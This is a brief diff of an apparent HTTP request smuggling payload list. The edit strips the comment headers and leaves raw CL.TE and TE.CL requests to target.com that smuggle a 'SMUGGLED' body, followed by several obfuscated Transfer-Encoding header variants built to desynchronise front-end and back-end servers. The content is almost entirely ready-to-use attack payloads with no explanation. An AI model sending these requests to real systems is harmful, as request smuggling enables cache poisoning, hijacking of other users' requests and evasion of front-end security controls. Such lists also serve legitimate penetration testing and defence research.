@@ -8,30 +8,24 @@ Transfer-Encoding: chunk
 TE: chunked
 TE: trailers
 
-# ============================================================
-# HTTP REQUEST SMUGGLING
-# ============================================================
-# CL.TE (Content-Length takes precedence):
 POST / HTTP/1.1
 Host: target.com
 Content-Length: 13
 Transfer-Encoding: chunked
- 
+
 0
- 
+
 SMUGGLED
- 
-# TE.CL (Transfer-Encoding takes precedence):
+
 POST / HTTP/1.1
 Host: target.com
 Content-Length: 3
 Transfer-Encoding: chunked
- 
+
 8
 SMUGGLED
 0
- 
-# TE.TE bypass (obfuscate Transfer-Encoding):
+
 Transfer-Encoding: xchunked
 Transfer-Encoding : chunked
 Transfer-Encoding: chunked
@@ -41,4 +35,3 @@ Transfer-Encoding: [tab]chunked
 X: X[\n]Transfer-Encoding: chunked
 Transfer-Encoding
 : chunked
- 
